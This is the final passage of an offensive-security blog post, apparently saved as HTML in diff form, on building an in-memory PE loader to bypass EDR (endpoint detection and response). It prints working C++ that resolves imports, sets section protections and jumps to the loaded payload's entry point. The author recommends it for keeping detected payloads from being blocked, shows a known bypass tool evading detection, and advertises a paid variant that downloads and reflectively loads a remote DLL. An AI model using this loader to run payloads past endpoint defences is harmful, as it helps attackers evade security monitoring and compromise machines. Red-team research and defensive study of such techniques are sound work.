+                    <span class="n">firstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">proc</span><span class="p">;</span>
+                    <span class="n">functionCount</span><span class="o">++</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Failed to resolve function</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="o">++</span><span class="n">origFirstThunk</span><span class="p">;</span>
+                <span class="o">++</span><span class="n">firstThunk</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Resolved "</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">functionCount</span> <span class="o">&lt;&lt;</span> <span class="s">" functions for DLL "</span> <span class="o">&lt;&lt;</span> <span class="n">dllName</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+            <span class="o">++</span><span class="n">importDesc</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] All imports resolved successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] No imports to resolve (import directory empty).</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We’re finally making our way to the finish line with our PE loader!  In this fairly large section of code (sorry about that, but I need me some cout «&nbsp;😸), we will be resolving all the imports of our 64-bit PE file by processing its import directory to load required DLLs and their functions into memory. We start by accessesing the import directory (<code class="language-plaintext highlighter-rouge">IMAGE_DIRECTORY_ENTRY_IMPORT</code>) from our PE’s NT headers, and if it exists (<code class="language-plaintext highlighter-rouge">importDir-&gt;Size &gt; 0</code>), we iterate through import descriptors. For each descriptor, we will load the specified DLL using <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> and retrieve function addresses from the DLL using <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, either by ordinal (if the import is by ordinal) or by name (using <code class="language-plaintext highlighter-rouge">PIMAGE_IMPORT_BY_NAME</code>). These addresses are written to the Import Address Table (IAT) at <code class="language-plaintext highlighter-rouge">firstThunk</code>, ensuring the PE file can call the required external functions. The process continues until all imports for each DLL are resolved, returning false if any DLL fails to load.  That’s it in a nutshell!</p>
+
+<p>Here’s what this looks like when the program is running:</p>
+
+<p><img width="1043" height="405" alt="image" src="https://github.com/user-attachments/assets/65a1d8d8-611b-4d98-a6f3-1fcf6979c46e"></p>
+
+<h2 id="section-memory-protection-adjustments--calling-the-entry-point"><strong><em>Section Memory Protection Adjustments &amp; Calling The Entry Point</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#section-memory-protection-adjustments--calling-the-entry-point" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">section</span> <span class="o">=</span> <span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">ntHeaders</span><span class="p">);</span>
+ <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">,</span> <span class="o">++</span><span class="n">section</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">DWORD</span> <span class="n">protect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_EXECUTE</span><span class="p">)</span> <span class="p">{</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span><span class="p">)</span> <span class="n">protect</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span><span class="p">)</span> <span class="n">protect</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="k">else</span> <span class="p">{</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_READ</span><span class="p">)</span> <span class="n">protect</span> <span class="o">=</span> <span class="n">PAGE_READONLY</span><span class="p">;</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Characteristics</span> <span class="o">&amp;</span> <span class="n">IMAGE_SCN_MEM_WRITE</span><span class="p">)</span> <span class="n">protect</span> <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">;</span>
+     <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">,</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">Misc</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">,</span> <span class="n">protect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+ <span class="p">}</span>
+
+ <span class="c1">// Call entry point</span>
+ <span class="n">DWORD_PTR</span> <span class="n">entry</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
+ <span class="k">auto</span> <span class="n">entryPoint</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">entry</span><span class="p">;</span>
+ <span class="n">entryPoint</span><span class="p">();</span>
+
+ <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>As we close out the remaining pieces of code for our PE loader, we finally make it to the portion of code that sets the appropriate memory protections based on each section’s characteristics.</p>
+
+<p>In short, we will need to iterate through each of our PE’s file sections, starting from the first section header (<code class="language-plaintext highlighter-rouge">IMAGE_FIRST_SECTION(ntHeaders</code>)), to set appropriate memory protections based on each section’s characteristics. For each of the <code class="language-plaintext highlighter-rouge">ntHeaders-&gt;FileHeader.NumberOfSections</code> sections, we check the section’s flags (<code class="language-plaintext highlighter-rouge">section-&gt;Characteristics</code>). If the section is executable (<code class="language-plaintext highlighter-rouge">IMAGE_SCN_MEM_EXECUTE</code>), we assign <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ</code>, <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> if writable, and so on. For non-executable sections, we simply assign <code class="language-plaintext highlighter-rouge">PAGE_READONLY</code> or <code class="language-plaintext highlighter-rouge">PAGE_READWRITE</code>. Next comes the VirtualProtect function, which applies the chosen protection to the memory region specified at <code class="language-plaintext highlighter-rouge">imageBase + section-&gt;VirtualAddress</code> with size <code class="language-plaintext highlighter-rouge">section-&gt;Misc.VirtualSize</code>, storing the previous protection in oldProtect. This ensures each section (e.g., .text for code, .data for variables) has the correct permissions for execution. 😺</p>
+
+<p>Lastly, we need to call our loaded PE’s entry point. We calculate our PE’s entry point memory address as <code class="language-plaintext highlighter-rouge">imageBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint</code>, where <code class="language-plaintext highlighter-rouge">imageBase</code> is the base address of our loaded PE image and <code class="language-plaintext highlighter-rouge">AddressOfEntryPoint</code> is the offset to our PE Loader program’s starting function.</p>
+
+<h2 id="bring-it-all-together-and-make-things-happen"><strong><em>Bring it all together and make things Happen!</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#bring-it-all-together-and-make-things-happen" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Loading PE in memory...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+   
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">LoadPEInMemory</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Failed to load PE</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Oh you know what this code does 😸  I don’t even need to explain.  But I will show a screenshot!</p>
+
+<p><img width="1277" height="986" alt="image" src="https://github.com/user-attachments/assets/2d924db5-3486-43cf-b564-8ca860d3935d"></p>
+
+<p>We did it!  So, take this code (full source code below) and try it yourself with various PE executables.  I have folks reach out to me often wondering about why their particular payload was detected by EDR.  I almost always inevitably end up encouraging them to use a PE loader, especially in memory pe loader. It really tends to help dissuade EDR detections from taking action more often than you’d think.</p>
+
+<p><strong>Example using a known EDR bypass tool that should be detected</strong></p>
+
+<p><img width="1314" height="744" alt="image" src="https://github.com/user-attachments/assets/40005fb2-2bc0-46b2-9cb3-d21638685694"></p>
+
+<p><strong>And without using the PE Loader:</strong></p>
+
+<p><img width="399" height="485" alt="image" src="https://github.com/user-attachments/assets/0c6e1811-e8a6-4dbf-b75e-2565a321f3d6"></p>
+
+<p><strong>Disclaimer</strong>: Because I know someone will say IT DIDN’T WORK!  EDR DETECTED IT!  Yeah, it happens.  I’m not certifying this as foolproof FUD.  In fact I’ll readily admit running this 10-20 times in a row will likely trip up EDR with an AI!ML alert because EDR solutions have AI intelligence built in these days.  It will eventually get caught if you’re continually running it, or at least I’d assume it would eventually catch it. 😄</p>
+
+<h2 id="-bonus-content-for-subscribers-in-memory-pe-loader-for-dlls--reflective-dll-loader">🔒 Bonus Content for Subscribers (In-Memory PE loader for DLLs / Reflective DLL Loader!)<a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#-bonus-content-for-subscribers-in-memory-pe-loader-for-dlls--reflective-dll-loader" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<blockquote>
+  <p>Description: This code will download a DLL from a location you specify, similar to today’s post, and reflectively load/execute it in memory!  In this case, it’s a DLL instead of an EXE. 😸</p>
+</blockquote>
+
+<p>🗒️ <a href="https://ko-fi.com/s/7e66117e37">Access Code Here</a> 🗒️</p>
+
+<hr>
+
+<p>Until next time! Later dudes and dudettes 😺</p>
+
+<p>Source code: <a href="https://github.com/g3tsyst3m/CodefromBlog/tree/main/2025-9-23-Bypassing%20EDR%20using%20an%20In-Memory%20PE%20Loader">PE LOADER FULL SOURCE CODE</a></p>
+
+<h2 id="anyrun-results"><strong><em>ANY.RUN Results</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#anyrun-results" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p><img width="1038" height="858" alt="image" src="https://github.com/user-attachments/assets/dd821301-4df7-402a-9617-dad5cbfe9f55"></p>
+
+<p><a href="https://app.any.run/tasks/9a8f5f38-1334-418d-84ef-a63d4808a209">Full Sandbox Analysis</a></p>
+
+<div style="text-align: right;">
+Sponsored by:<br>
+<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
+</div>
+
+
+        
+      </section>
+
+      
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Bypassing+EDR+using+an+In-Memory+PE+Loader%20https%3A%2F%2Fg3tsyst3m.com%2Ffileless%2520techniques%2FBypassing-EDR-using-an-In-Memory-PE-Loader%2F" class="btn btn--twitter" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fg3tsyst3m.com%2Ffileless%2520techniques%2FBypassing-EDR-using-an-In-Memory-PE-Loader%2F" class="btn btn--facebook" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fg3tsyst3m.com%2Ffileless%2520techniques%2FBypassing-EDR-using-an-In-Memory-PE-Loader%2F" class="btn btn--linkedin" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"><div class="utterances">
+    <div class="utterances-frame" title="Comments" scrolling="no" src="cid:frame-35887A8E8C282160845F34AF36325FF5@mhtml.blink" loading="lazy" data-original-tag="iframe"></div>
+  </div></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/ropgadget.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/lotp/Living-off-the-Process/" rel="permalink">Living off the Process
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-29T00:00:00+00:00">January 29, 2026</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          14 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello again everyone!  Hope the start to the new year is treating you well.  I am excited to share a new blog post with you!  Furthermore, I’d consider the c...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/chunkyshellcode.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/shellcode%20fragmentation/in-memory%20evasion/Evading-Signature-Based-Memory-Detection-Shellcode-Fragmentation-and-Staged-Reassembly/" rel="permalink">Evading Signature Based Memory Detection - Shellcode Fragmentation and Staged Reassembly
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2025-12-23T00:00:00+00:00">December 23, 2025</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hey everyone, and hope the holiday season is treating you well!  🎅🎄🎁  I’ve been sitting on this blog post for quite some time now and it’s high time I went a...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/memmapper2.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-2/" rel="permalink">PIC Shellcode from the Ground up - Part 2
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2025-11-25T00:00:00+00:00">November 25, 2025</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          20 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Let’s PIC back up where we left off shall we? 😸 I gave you the framework for developing PIC friendly shellcode back in Part 1.  We went from the original cod...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/memmapper.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-1/" rel="permalink">PIC Shellcode from the Ground up - Part 1
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2025-11-05T00:00:00+00:00">November 5, 2025</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          23 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Have you ever wondered how the popularized PIC (position independent code) actually works?  I can answer that question alongside you with a resounding YES! Y...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    
+
+    
+  
+
+
+
+
+
+
+
+    
+
+  
+
+
+
+
+
+  
+
+</body></html>
